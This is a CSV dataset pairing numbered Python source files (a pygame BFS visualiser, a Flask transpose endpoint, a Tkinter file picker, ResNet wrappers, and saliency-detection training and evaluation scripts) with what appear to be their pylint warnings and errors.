input,output
"1   # use pygame to show the board on a window
2   
3   # dependencies
4   import pygame, random
5   
6   class Window:
7       def __init__(self, board):
8           # init py game
9           pygame.init()
10   
11           # width height
12           self.WIDTH = 600
13           self.HEIGHT = 600
14   
15           # diffenet display modes
16           self.display_one = False
17           self.display_all = False
18   
19           # place holder
20           self.solution = []
21           self.display_all_c = 0
22   
23           # the board to display on the window
24           self.board = board
25   
26           # define the dimensions of the cells of the board
27           self.cell_width = self.WIDTH // self.board.width
28   
29           # define the left padding for the grid
30           total_width = self.cell_width * self.board.width
31           self.left_padding = (self.WIDTH - total_width) // 2
32   
33   
34           # colors
35           self.COLORS = {
36               ""BLACK"" : (255, 255, 255),
37               ""GREY"" : (230, 230, 230),
38               ""BLUE"" : (0, 0, 255),
39               ""RED"" : (255, 0, 0),
40               ""YELLOW"" : (212, 175, 55) 
41           }
42   
43       def create_random_color(self):
44           return (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
45   
46       def create_window(self):
47           # define window
48           self.WIN = pygame.display.set_mode( (self.WIDTH, self.HEIGHT) )
49   
50           # name window
51           pygame.display.set_caption(""LIGHT NING"")
52   
53           # logo/icon for window
54           logo = pygame.image.load(""images/logo.png"")
55           pygame.display.set_icon(logo)
56   
57       def get_BFS(self):
58           solved = False
59           while not solved:
60               self.board.create_random_grid()
61               paths, index = self.board.BFS()
62   
63               if paths != False and index != False:            
64                   self.solution = paths[index]
65                   solved = True
66   
67                   self.paths = paths
68                   self.solution_i = index
69   
70       def draw_grid_solution(self):
71           fflag = True
72           for i in range(self.board.width * self.board.height):
73               if not i in self.solution: continue
74   
75               # might not work
76               col_num = i % self.board.width
77               row_num = i // self.board.width
78   
79               x_pos = self.left_padding + (col_num * self.cell_width)
80               y_pos = row_num * self.cell_width
81   
82               # define rect
83               r = pygame.Rect(x_pos, y_pos, self.cell_width, self.cell_width)
84   
85               # draw the rectangle
86               pygame.draw.rect(self.WIN, self.COLORS[""YELLOW""], r)
87   
88       def draw_BFS(self):
89           if self.display_all_c >= len(self.paths):
90               self.display_all_c = 0
91   
92           # generate a color for each path
93           path_colors = []
94           for path in self.paths:
95               path_colors.append(self.create_random_color())
96           path_colors[-1] = (0, 0 ,0)
97   
98           temp = self.paths.pop(self.display_all_c)
99           self.paths.append(temp)
100   
101           for path in self.paths:
102               for i in path:
103                   # might not work
104                   col_num = i % self.board.width
105                   row_num = i // self.board.width
106   
107                   x_pos = self.left_padding + (col_num * self.cell_width)
108                   y_pos = row_num * self.cell_width
109   
110                   # define rect
111                   r = pygame.Rect(x_pos, y_pos, self.cell_width, self.cell_width)
112   
113                   # draw the rectangle
114                   pygame.draw.rect(self.WIN, path_colors[self.paths.index(path)], r)
115   
116           self.display_all_c += 1
117           
118                   
119       def draw_window(self):
120           self.WIN.fill(self.COLORS[""GREY""])
121   
122           if self.display_one:
123               self.draw_grid_solution()
124           elif self.display_all:
125               self.draw_BFS()
126   
127           pygame.display.update()
128   
129       def main(self):
130           # create window
131           self.create_window()
132   
133           self.running = True
134           while self.running:
135               for event in pygame.event.get():
136                   if event.type == pygame.QUIT:
137                       self.running = False
138   
139                   elif event.type == pygame.KEYDOWN:
140                       if event.key == pygame.K_0:
141                           self.get_BFS()
142                       elif event.key == pygame.K_1:
143                           # toggle display one
144                           self.display_one = not self.display_one
145                           if self.display_one:
146                               self.display_all = False
147                       elif event.key == pygame.K_2:
148                           # toggle display all
149                           self.display_all = not self.display_all
150                           if self.display_all:
151                               self.display_all_c = 0
152                               self.display_one = False
153               
154               self.draw_window()
155   
156   if __name__ == ""__main__"":
157       win = Window()
158   
159       win.main()","6 - refactor: too-many-instance-attributes
71 - warning: unused-variable
48 - warning: attribute-defined-outside-init
67 - warning: attribute-defined-outside-init
68 - warning: attribute-defined-outside-init
133 - warning: attribute-defined-outside-init
137 - warning: attribute-defined-outside-init
157 - error: no-value-for-parameter
"
"1   # this could and will be better i just needed to make it here as a 
2   # proof of concept but it will be online and better later
3   
4   import os, sys
5   
6   BASE_PATH = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) # adds project dir to places it looks for the modules
7   sys.path.append(BASE_PATH)
8   
9   from lib.board import Board
10   from lib.window import Window
11   
12   b = Board()
13   win = Window(b)
14   
15   win.main()","Clean Code: No Issues Detected
"
"1   from flask import Flask, render_template, request, jsonify
2   from flask_cors import CORS
3   import json
4   import numpy as np
5   
6   app = Flask(__name__)
7   CORS(app)
8   
9   
10   @app.route('/transpose', methods=[""POST""])
11   def homepage():
12       data = request.json
13       result = None
14       error = """"
15       try:
16           mat = data[""matrix""]
17           mat = np.array(mat)
18           result = mat.T.tolist()
19           error = """"
20       except KeyError as e:
21           error = ""Key %s not found"" % (str(e))
22           pass
23       except Exception as e:
24           error = str(e)
25           pass
26       return jsonify({""result"": result, ""error"": error})
27   
28   
29   app.run()
","23 - warning: broad-exception-caught
22 - warning: unnecessary-pass
25 - warning: unnecessary-pass
1 - warning: unused-import
3 - warning: unused-import
"
"1   from tkinter import *
2   from tkinter import ttk
3   from tkinter import filedialog
4   import test_python3
5   
6   class Root(Tk):
7       def __init__(self):
8           super(Root, self).__init__()
9           self.title(""Malware Detection"")
10           self.minsize(500, 300)
11   
12           self.labelFrame = ttk.LabelFrame(self, text = ""     Open File"")
13           self.labelFrame.grid(column = 0, row = 1, padx = 200, pady = 20)
14   
15           self.button()
16   
17   
18   
19       def button(self):
20           self.button = ttk.Button(self.labelFrame, text = ""Browse A File"",command = self.fileDialog)
21           self.button.grid(column = 1, row = 1)
22   
23   
24       def fileDialog(self):
25   
26           self.filename = filedialog.askopenfilename(initialdir =  ""/"", title = ""Select A File"")
27           self.label = ttk.Label(self.labelFrame, text = """")
28           self.label.grid(column = 1, row = 2)
29           self.label.configure(text = self.filename)
30   
31   
32   
33   
34   root = Root()
35   root.mainloop()","1 - warning: wildcard-import
8 - refactor: super-with-arguments
15 - error: not-callable
19 - error: method-hidden
26 - warning: attribute-defined-outside-init
27 - warning: attribute-defined-outside-init
4 - warning: unused-import
1 - warning: unused-wildcard-import
"
"1   from .resnext101 import ResNeXt101
","1 - error: relative-beyond-top-level
1 - warning: unused-import
"
"1   from .resnet import ResNet, BasicBlock, Bottleneck
2   import torch
3   from torch import nn
4   from .config import resnet50_path
5   
6   model_urls = {
7       'resnet18': 'https://download.pytorch.org/models/resnet18-5c106cde.pth',
8       'resnet34': 'https://download.pytorch.org/models/resnet34-333f7ec4.pth',
9       'resnet50': 'https://download.pytorch.org/models/resnet50-19c8e357.pth',
10       'resnet101': 'https://download.pytorch.org/models/resnet101-5d3b4d8f.pth',
11       'resnet152': 'https://download.pytorch.org/models/resnet152-b121ed2d.pth',
12   }
13   
14   class ResNet50(nn.Module):
15       def __init__(self):
16           super(ResNet50, self).__init__()
17           net = ResNet(last_stride=2,
18                       block=Bottleneck, frozen_stages=False,
19                       layers=[3, 4, 6, 3])
20           net.load_param(resnet50_path)
21   
22           self.layer0 = net.layer0
23           self.layer1 = net.layer1
24           self.layer2 = net.layer2
25           self.layer3 = net.layer3
26           self.layer4 = net.layer4
27   
28       def forward(self, x):
29           layer0 = self.layer0(x)
30           layer1 = self.layer1(layer0)
31           layer2 = self.layer2(layer1)
32           layer3 = self.layer3(layer2)
33           layer4 = self.layer4(layer3)
34           return layer4
35       
36       def load_param(self, trained_path):
37           param_dict = torch.load(trained_path)
38           for i in param_dict:
39               if 'classifier' in i or 'arcface' in i:
40                   continue
41               self.state_dict()[i].copy_(param_dict[i])
42           print('Loading pretrained model from {}'.format(trained_path))
43   
44   
45   class ResNet50_BIN(nn.Module):
46       def __init__(self):
47           super(ResNet50_BIN, self).__init__()
48           net = ResNet(last_stride=2,
49                       block=IN_Bottleneck, frozen_stages=False,
50                       layers=[3, 4, 6, 3])
51           net.load_param(resnet50_path)
52   
53           self.layer0 = net.layer0
54           self.layer1 = net.layer1
55           self.layer2 = net.layer2
56           self.layer3 = net.layer3
57           self.layer4 = net.layer4
58   
59       def forward(self, x):
60           layer0 = self.layer0(x)
61           layer1 = self.layer1(layer0)
62           layer2 = self.layer2(layer1)
63           layer3 = self.layer3(layer2)
64           layer4 = self.layer4(layer3)
65           return layer4
66       
67       def load_param(self, trained_path):
68           param_dict = torch.load(trained_path)
69           for i in param_dict:
70               if 'classifier' in i or 'arcface' in i:
71                   continue
72               self.state_dict()[i].copy_(param_dict[i])
73           print('Loading pretrained model from {}'.format(trained_path))
74   
75   
76   class ResNet50_LowIN(nn.Module):
77       def __init__(self):
78           super(ResNet50_LowIN, self).__init__()
79           net = ResNet_LowIN(last_stride=2,
80                       block=Bottleneck, frozen_stages=False,
81                       layers=[3, 4, 6, 3])
82           net.load_param(resnet50_path)
83   
84           self.layer0 = net.layer0
85           self.layer1 = net.layer1
86           self.layer2 = net.layer2
87           self.layer3 = net.layer3
88           self.layer4 = net.layer4
89   
90       def forward(self, x):
91           layer0 = self.layer0(x)
92           layer1 = self.layer1(layer0)
93           layer2 = self.layer2(layer1)
94           layer3 = self.layer3(layer2)
95           layer4 = self.layer4(layer3)
96           return layer4
97       
98       def load_param(self, trained_path):
99           param_dict = torch.load(trained_path)
100           for i in param_dict:
101               if 'classifier' in i or 'arcface' in i:
102                   continue
103               self.state_dict()[i].copy_(param_dict[i])
104           print('Loading pretrained model from {}'.format(trained_path))
","1 - error: relative-beyond-top-level
4 - error: relative-beyond-top-level
16 - refactor: super-with-arguments
47 - refactor: super-with-arguments
49 - error: undefined-variable
78 - refactor: super-with-arguments
79 - error: undefined-variable
1 - warning: unused-import
"
"1   resnet50_path = './resnet/resnet50-19c8e357.pth'
","Clean Code: No Issues Detected
"
"1   from .make_model import ResNet50, ResNet50_BIN, ResNet50_LowIN","1 - error: relative-beyond-top-level
1 - warning: unused-import
1 - warning: unused-import
1 - warning: unused-import
"
"1   import datetime
2   import os
3   import time
4   
5   import torch
6   from torch import nn
7   from torch import optim
8   from torch.autograd import Variable
9   from torch.utils.data import DataLoader
10   from torchvision import transforms
11   import pandas as pd
12   import numpy as np
13   
14   import joint_transforms
15   from config import msra10k_path, MTDD_train_path
16   from datasets import ImageFolder_joint
17   from misc import AvgMeter, check_mkdir, cal_sc
18   from model import R3Net, SDCNet
19   from torch.backends import cudnn
20   
21   cudnn.benchmark = True
22   
23   torch.manual_seed(2021)
24   torch.cuda.set_device(6)
25   
26   csv_path = './label_DUTS-TR.csv'
27   ckpt_path = './ckpt'
28   exp_name ='SDCNet'
29   
30   args = {
31       'iter_num': 30000,
32       'train_batch_size': 16,
33       'last_iter': 0,
34       'lr': 1e-3,
35       'lr_decay': 0.9,
36       'weight_decay': 5e-4,
37       'momentum': 0.9,
38       'snapshot': ''
39   }
40   
41   joint_transform = joint_transforms.Compose([
42       joint_transforms.RandomCrop(300),
43       joint_transforms.RandomHorizontallyFlip(),
44       joint_transforms.RandomRotate(10)
45   ])
46   img_transform = transforms.Compose([
47       transforms.ToTensor(),
48       transforms.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225])
49   ])
50   target_transform = transforms.ToTensor()
51   to_pil = transforms.ToPILImage()
52   
53   all_data = pd.read_csv(csv_path)
54   train_set = ImageFolder_joint(all_data, joint_transform, img_transform, target_transform)
55   train_loader = DataLoader(train_set, batch_size=args['train_batch_size'], num_workers=0, shuffle=True, drop_last=True)#
56   
57   log_path = os.path.join(ckpt_path, exp_name, str(datetime.datetime.now()) + '.txt')
58   
59   
60   def main():
61       net = SDCNet(num_classes = 5).cuda().train() # 
62       
63       print('training in ' + exp_name)
64       optimizer = optim.SGD([
65           {'params': [param for name, param in net.named_parameters() if name[-4:] == 'bias'],
66            'lr': 2 * args['lr']},
67           {'params': [param for name, param in net.named_parameters() if name[-4:] != 'bias'],
68            'lr': args['lr'], 'weight_decay': args['weight_decay']}
69       ], momentum=args['momentum'])
70   
71       if len(args['snapshot']) > 0:
72           print('training resumes from ' + args['snapshot'])
73           net.load_state_dict(torch.load(os.path.join(ckpt_path, exp_name, args['snapshot'] + '.pth')))
74           optimizer.load_state_dict(torch.load(os.path.join(ckpt_path, exp_name, args['snapshot'] + '_optim.pth')))
75           optimizer.param_groups[0]['lr'] = 2 * args['lr']
76           optimizer.param_groups[1]['lr'] = args['lr']
77   
78       check_mkdir(ckpt_path)
79       check_mkdir(os.path.join(ckpt_path, exp_name))
80       open(log_path, 'w').write(str(args) + '\n\n')
81       train(net, optimizer)
82   
83   
84   def train(net, optimizer):
85       start_time = time.time()
86       curr_iter = args['last_iter']
87       num_class = [0, 0, 0, 0, 0]
88       while True:
89           total_loss_record, loss0_record, loss1_record, loss2_record = AvgMeter(), AvgMeter(), AvgMeter(), AvgMeter()
90   
91           batch_time = AvgMeter()
92           end = time.time()
93           print('-----begining the first stage, train_mode==0-----')
94           for i, data in enumerate(train_loader):
95               optimizer.param_groups[0]['lr'] = 2 * args['lr'] * (1 - float(curr_iter) / args['iter_num']
96                                                                   ) ** args['lr_decay']
97               optimizer.param_groups[1]['lr'] = args['lr'] * (1 - float(curr_iter) / args['iter_num']
98                                                               ) ** args['lr_decay']
99   
100               inputs, gt, labels = data
101               print(labels)
102               # depends on the num of classes
103               cweight = torch.tensor([0.5, 0.75, 1, 1.25, 1.5])
104               #weight = torch.ones(size=gt.shape)
105               weight = gt.clone().detach()
106               sizec = labels.numpy()
107               #ta = np.zeros(shape=gt.shape)
108               '''
109               np.zeros(shape=labels.shape)
110               sc = gt.clone().detach()
111               for i in range(len(sizec)):
112                   gta = np.array(to_pil(sc[i,:].data.squeeze(0).cpu()))#
113                   #print(gta.shape)
114                   labels[i] = cal_sc(gta)
115                   sizec[i] = labels[i]
116               print(labels)
117               '''
118               batch_size = inputs.size(0)
119               inputs = Variable(inputs).cuda()
120               gt = Variable(gt).cuda()
121               labels = Variable(labels).cuda()
122   
123               #print(sizec.shape)
124   
125               optimizer.zero_grad()
126               p5, p4, p3, p2, p1, predict1, predict2, predict3, predict4, predict5, predict6, predict7, predict8, predict9, predict10, predict11 = net(inputs, sizec) # mode=1
127   
128               criterion = nn.BCEWithLogitsLoss().cuda()
129               criterion2 = nn.CrossEntropyLoss().cuda()
130   
131               gt2 = gt.long()
132               gt2 = gt2.squeeze(1)
133   
134               l5 = criterion2(p5, gt2)
135               l4 = criterion2(p4, gt2)
136               l3 = criterion2(p3, gt2)
137               l2 = criterion2(p2, gt2)
138               l1 = criterion2(p1, gt2)
139   
140               loss0 = criterion(predict11, gt)
141               loss10 = criterion(predict10, gt)
142               loss9 = criterion(predict9, gt)
143               loss8 = criterion(predict8, gt)
144               loss7 = criterion(predict7, gt)
145               loss6 = criterion(predict6, gt)
146               loss5 = criterion(predict5, gt)
147               loss4 = criterion(predict4, gt)
148               loss3 = criterion(predict3, gt)
149               loss2 = criterion(predict2, gt)
150               loss1 = criterion(predict1, gt)
151   
152               total_loss = l1 + l2 + l3 + l4 + l5 + loss0 + loss1 + loss2 + loss3 + loss4 + loss5 + loss6 + loss7 + loss8 + loss9 + loss10
153   
154               total_loss.backward()
155               optimizer.step()
156   
157               total_loss_record.update(total_loss.item(), batch_size)
158               loss1_record.update(l5.item(), batch_size)
159               loss0_record.update(loss0.item(), batch_size)
160   
161               curr_iter += 1.0
162               batch_time.update(time.time() - end)
163               end = time.time()
164   
165               log = '[iter %d], [R1/Mode0], [total loss %.5f]\n' \
166                     '[l5 %.5f], [loss0 %.5f]\n' \
167                     '[lr %.13f], [time %.4f]' % \
168                     (curr_iter, total_loss_record.avg, loss1_record.avg, loss0_record.avg, optimizer.param_groups[1]['lr'],
169                      batch_time.avg)
170               print(log)
171               print('Num of class:', num_class)
172               open(log_path, 'a').write(log + '\n')
173   
174               if curr_iter == args['iter_num']:
175                   torch.save(net.state_dict(), os.path.join(ckpt_path, exp_name, '%d.pth' % curr_iter))
176                   torch.save(optimizer.state_dict(),
177                              os.path.join(ckpt_path, exp_name, '%d_optim.pth' % curr_iter))
178                   total_time = time.time() - start_time
179                   print(total_time)
180                   return
181   
182   
183   if __name__ == '__main__':
184       main()
","16 - error: no-name-in-module
80 - refactor: consider-using-with
80 - warning: unspecified-encoding
84 - refactor: too-many-locals
108 - warning: pointless-string-statement
172 - refactor: consider-using-with
172 - warning: unspecified-encoding
84 - refactor: too-many-statements
89 - warning: unused-variable
94 - warning: unused-variable
103 - warning: unused-variable
105 - warning: unused-variable
12 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
17 - warning: unused-import
18 - warning: unused-import
"
"1   import numpy as np
2   import os
3   
4   import torch
5   from PIL import Image
6   from torch.autograd import Variable
7   from torchvision import transforms
8   from torch.utils.data import DataLoader
9   import matplotlib.pyplot as plt
10   import pandas as pd
11   from tqdm import tqdm
12   import cv2
13   import numpy as np
14   
15   from config import ecssd_path, hkuis_path, pascals_path, sod_path, dutomron_path, MTDD_test_path
16   from misc import check_mkdir, crf_refine, AvgMeter, cal_precision_recall_mae, cal_fmeasure
17   from datasets import TestFolder_joint
18   import joint_transforms
19   from model import HSNet_single1, HSNet_single1_ASPP, HSNet_single1_NR, HSNet_single2, SDMS_A, SDMS_C
20   
21   torch.manual_seed(2018)
22   
23   # set which gpu to use
24   torch.cuda.set_device(0)
25   
26   ckpt_path = './ckpt' 
27   test_path = './test_ECSSD.csv'
28   
29   
30   def main():
31       img = np.zeros((512, 512),dtype = np.uint8)
32       img2 = cv2.imread('./0595.PNG', 0)
33       cv2.imshow('img',img2)
34       #cv2.waitKey(0)
35       print(img, img2)
36       Image.fromarray(img).save('./free.png')
37               
38   
39   
40   if __name__ == '__main__':
41       main()
","13 - warning: reimported
17 - error: no-name-in-module
2 - warning: unused-import
6 - warning: unused-import
7 - warning: unused-import
8 - warning: unused-import
9 - warning: unused-import
10 - warning: unused-import
11 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
16 - warning: unused-import
16 - warning: unused-import
16 - warning: unused-import
16 - warning: unused-import
16 - warning: unused-import
17 - warning: unused-import
18 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
"
"1   import os
2   import os.path
3   
4   import torch.utils.data as data
5   from PIL import Image
6   
7   
8   class ImageFolder_joint(data.Dataset):
9       # image and gt should be in the same folder and have same filename except extended name (jpg and png respectively)
10       def __init__(self, label_list, joint_transform=None, transform=None, target_transform=None):
11           imgs = []
12           self.label_list = label_list
13           for index, row in label_list.iterrows():
14               imgs.append((row['img_path'], row['gt_path'], row['label']))
15           self.imgs = imgs
16           self.joint_transform = joint_transform
17           self.transform = transform
18           self.target_transform = target_transform
19   
20       def __len__(self):
21           return len(self.label_list)
22   
23       def __getitem__(self, index):
24           img_path, gt_path, label = self.imgs[index]
25           img = Image.open(img_path).convert('RGB')
26           target = Image.open(gt_path).convert('L')
27           if self.joint_transform is not None:
28               img, target = self.joint_transform(img, target)
29           if self.transform is not None:
30               img = self.transform(img)
31           if self.target_transform is not None:
32               target = self.target_transform(target)
33   
34           return img, target, label
35   
36   class ImageFolder_joint_for_edge(data.Dataset):
37       # image and gt should be in the same folder and have same filename except extended name (jpg and png respectively)
38       def __init__(self, label_list, joint_transform=None, transform=None, target_transform=None):
39           imgs = []
40           for index, row in label_list.iterrows():
41               imgs.append((row['img_path'], row['gt_path'], row['label']))
42           self.imgs = imgs
43           self.joint_transform = joint_transform
44           self.transform = transform
45           self.target_transform = target_transform
46   
47       def __getitem__(self, index):
48           img_path, gt_path, label = self.imgs[index]
49           edge_path = "".""+gt_path.split(""."")[1]+""_edge.""+gt_path.split(""."")[2]
50           img = Image.open(img_path).convert('RGB')
51           target = Image.open(gt_path).convert('L')
52           target_edge = Image.open(edge_path).convert('L')
53           if self.joint_transform is not None:
54               if img.size != target.size or img.size != target_edge.size:
55                   print(""error path:"", img_path, gt_path)
56                   print(""size:"", img.size, target.size, target_edge.size)
57               img, target, target_edge = self.joint_transform(img, target, target_edge)
58           if self.transform is not None:
59               img = self.transform(img)
60           if self.target_transform is not None:
61               target = self.target_transform(target)
62               target_edge = self.target_transform(target_edge)
63   
64           return img, target, target_edge, label
65   
66       def __len__(self):
67           return len(self.imgs)
68   
69   class TestFolder_joint(data.Dataset):
70       # image and gt should be in the same folder and have same filename except extended name (jpg and png respectively)
71       def __init__(self, label_list, joint_transform=None, transform=None, target_transform=None):
72           imgs = []
73           for index, row in label_list.iterrows():
74               imgs.append((row['img_path'], row['gt_path'], row['label']))
75           self.imgs = imgs
76           self.joint_transform = joint_transform
77           self.transform = transform
78           self.target_transform = target_transform
79   
80       def __getitem__(self, index):
81           img_path, gt_path, label = self.imgs[index]
82           img = Image.open(img_path).convert('RGB')
83           target = Image.open(gt_path).convert('L')
84           if self.joint_transform is not None:
85               img, target = self.joint_transform(img, target)
86           if self.transform is not None:
87               img = self.transform(img)
88           if self.target_transform is not None:
89               target = self.target_transform(target)
90   
91           return img, target, label, img_path
92   
93       def __len__(self):
94           return len(self.imgs)
95   
96   
97   def make_dataset(root):
98       img_list = [os.path.splitext(f)[0] for f in os.listdir(root) if f.endswith('.jpg')]
99       return [(os.path.join(root, img_name + '.jpg'), os.path.join(root, img_name + '.png')) for img_name in img_list]
100   
101   
102   class ImageFolder(data.Dataset):
103       # image and gt should be in the same folder and have same filename except extended name (jpg and png respectively)
104       def __init__(self, root, joint_transform=None, transform=None, target_transform=None):
105           self.root = root
106           self.imgs = make_dataset(root)
107           self.joint_transform = joint_transform
108           self.transform = transform
109           self.target_transform = target_transform
110   
111       def __getitem__(self, index):
112           img_path, gt_path = self.imgs[index]
113           img = Image.open(img_path).convert('RGB')
114           target = Image.open(gt_path).convert('L')
115           if self.joint_transform is not None:
116               img, target = self.joint_transform(img, target)
117           if self.transform is not None:
118               img = self.transform(img)
119           if self.target_transform is not None:
120               target = self.target_transform(target)
121   
122           return img, target
123   
124       def __len__(self):
125           return len(self.imgs)
","4 - refactor: consider-using-from-import
13 - warning: unused-variable
40 - warning: unused-variable
73 - warning: unused-variable
"
"1   import numpy as np
2   import os
3   
4   import torch
5   from PIL import Image
6   from torch.autograd import Variable
7   from torchvision import transforms
8   from torch.utils.data import DataLoader
9   import matplotlib.pyplot as plt
10   import pandas as pd
11   from tqdm import tqdm
12   
13   path_list = ['msra10k', 'ECSSD', 'DUT-OMROM', 'DUTS-TR', 'DUTS-TE', 'HKU-IS', 'PASCAL-S', 'SED2', 'SOC', 'SOD', 'THUR-15K']
14   
15   def main():
16       Dataset, Class0, Class1, Class2, Class3, Class4, Class5, Class6, Class7, Class8, Class9, Class10, Total = [], [], [], [], [], [], [], [], [], [], [], [], []
17       for data_path in path_list:
18           test_path = './SOD_label/label_' + data_path + '.csv'
19           print('Evalute for ' + test_path)
20           test_data = pd.read_csv(test_path)
21           imgs = []
22           num, c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10 = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
23           for index, row in test_data.iterrows():
24               imgs.append((row['img_path'], row['gt_path'], row['label']))
25               img_path, gt_path, label = imgs[index]
26   
27               if label == 0:
28                   c0 += 1
29               elif label == 1:
30                   c1 += 1
31               elif label == 2:
32                   c2 += 1
33               elif label == 3:
34                   c3 += 1
35               elif label == 4:
36                   c4 += 1
37               elif label == 5:
38                   c5 += 1
39               elif label == 6:
40                   c6 += 1
41               elif label == 7:
42                   c7 += 1
43               elif label == 8:
44                   c8 += 1
45               elif label == 9:
46                   c9 += 1
47               elif label == 10:
48                   c10 += 1
49               num += 1
50           print('[Class0 %.f], [Class1 %.f], [Class2 %.f], [Class3 %.f]\n'\
51                 '[Class4 %.f], [Class5 %.f], [Class6 %.f], [Class7 %.f]\n'\
52                 '[Class8 %.f], [Class9 %.f], [Class10 %.f], [Total %.f]\n'%\
53                 (c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, num)
54                 )
55           Dataset.append(data_path)
56           Class0.append(c0)
57           Class1.append(c1)
58           Class2.append(c2)
59           Class3.append(c3)
60           Class4.append(c4)
61           Class5.append(c5)
62           Class6.append(c6)
63           Class7.append(c7)
64           Class8.append(c8)
65           Class9.append(c9)
66           Class10.append(c10)
67           Total.append(num)
68   
69       label_file = pd.DataFrame({'Datasets': Dataset, 'Class 0': Class0, 'Class 1': Class1, 'Class 2': Class2, 'Class 3': Class3, 'Class 4': Class4, 'Class 5': Class5, 'Class 6': Class6, 'Class 7': Class7, 'Class 8': Class8, 'Class 9': Class9, 'Class 10': Class10, 'Num of Pic': Total})
70       label_file = label_file[['Datasets', 'Class 0', 'Class 1', 'Class 2', 'Class 3', 'Class 4', 'Class 5', 'Class 6', 'Class 7', 'Class 8', 'Class 9', 'Class 10', 'Num of Pic']]
71   
72       label_file.to_csv('./Dataset_statistics.csv', index=False)
73   
74   if __name__ == '__main__':
75       main()
","15 - refactor: too-many-locals
15 - refactor: too-many-branches
25 - warning: unused-variable
25 - warning: unused-variable
1 - warning: unused-import
2 - warning: unused-import
4 - warning: unused-import
5 - warning: unused-import
6 - warning: unused-import
7 - warning: unused-import
8 - warning: unused-import
9 - warning: unused-import
11 - warning: unused-import
"
